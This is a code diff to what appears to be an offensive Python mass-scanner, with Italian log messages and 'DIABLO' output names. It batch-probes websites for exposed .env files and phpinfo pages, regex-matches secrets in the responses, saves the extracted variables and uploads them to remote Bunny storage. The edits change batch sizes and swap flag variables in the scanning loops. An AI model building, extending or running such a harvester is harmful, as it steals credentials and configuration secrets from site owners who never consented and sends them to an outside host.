@@ -66,7 +66,7 @@ MAX_IPS_PER_CIDR = 5
 TOTAL_SLOTS = 2000
 NUM_WORKERS = 10
 
-_CONTAINER_NAME = os.environ.get('HOSTNAME', f'test_{int(time.time())}')
+_CONTAINER_NAME = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
 _SLOT_HASH = int(hashlib.md5(_CONTAINER_NAME.encode()).hexdigest()[:12], 16)
 INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS
 
@@ -148,8 +148,8 @@ def generate_list_env_from_json_multi(site_link):
 
 def generate_list_phpprofile_from_json_multi(site_link):
     base = site_link.rstrip('/')
-    for i in range(0, len(file_phpprofile), 100):
-        yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 100]]
+    for i in range(0, len(file_phpprofile), 20):
+        yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 20]]
 
 def content_diablo_resp(req):
     if sys.version_info[0] < 3:
@@ -285,9 +285,9 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
         headers_file_probe['Range'] = 'bytes=0-4096'
         findfile_requests = []
         findfile_requestsunicque = []
-        regex_found = False
-        regex_found_one = False
         env_batches = site_payloads.get('env', [])
+        regex_found_one = False
+        regex_found = False
         for batch in env_batches:
             reqss = [grequests.get(url, stream=True, timeout=5, verify=False, allow_redirects=False) for url in batch]
             merdb = grequests.map(reqss)
@@ -297,7 +297,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                 if r: r.close()
             if len(findfile_requests) >= 10:
                 fake_for_site = True
-            if fake_for_site or found_for_site or regex_found: break
+            if fake_for_site or found_for_site or regex_found_one: break
 
 
             if len(findfile_requests) >= 1:
@@ -331,11 +331,11 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
 
                         for match in re.finditer(regex_pattern, content, re.IGNORECASE):
                             found_for_site = True
-                            regex_found = True
+                            regex_found_one = True
                             break
-                        if regex_found: break
+                        if regex_found_one: break
 
-                    if regex_found:
+                    if regex_found_one:
 
                         print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
                         rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
@@ -354,7 +354,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                     except: pass
 
 
-                if fake_for_site or found_for_site or regex_found: break
+                if fake_for_site or found_for_site: break
 
         if fake_for_site: return
 
@@ -405,7 +405,6 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                 
                         else: r.close()
 
-                if fake_for_site or found_for_site or regex_found_one: break
 
                 valid_responzzz = list(unique_responses.values())
                 if valid_responzzz:
@@ -428,13 +427,14 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
 
                                 for match in re.finditer(regex_pattern, contentsx, re.IGNORECASE):
                                     found_for_site = True
-                                    regex_found_one = True
+                                    regex_found = True
                                     break
-                                if regex_found_one: break
+                                if regex_found: break
 
-                            if regex_found_one:
+                            if regex_found:
 
                                 print(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}", flush=True)
+                                #rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
 
                                 saved_file_path = None
                                 remote_subpath = None
@@ -459,17 +459,18 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                                                         formatted_output += f"{clean_key} \t {var_value}\n"
                                             if formatted_output:
                                                 print(f"    [!] 🐘 TROVATO PHPINFO: {response_url}", flush=True)
-                                                rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+                                                rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
 
                                                 saved_file_path = None
                                                 remote_subpath = None
 
-                                                saved_file_path = os.path.join(newpathtextract, f'DIABLO_ENV_PHP_{rnd_suffix_php}.txt')
+                                                saved_file_path = os.path.join(newpathtextract, f'DIABLO_PHPINFO_{rnd_suffix}.txt')
                                                 with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
-                                                remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_ENV_PHP_{rnd_suffix_php}.txt"
+                                                remote_subpath = f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix}.txt"
 
                                                 if saved_file_path and remote_subpath:
                                                     upload_file_to_bunny(saved_file_path, remote_subpath)
+
 
                                 except: pass
 
@@ -477,7 +478,7 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
                         try: r.close()
                         except: pass
 
-                        if fake_for_site or found_for_site or regex_found_one: break
+                        if fake_for_site or found_for_site or regex_found: break
 
 
         if found_for_site and not is_fallback:
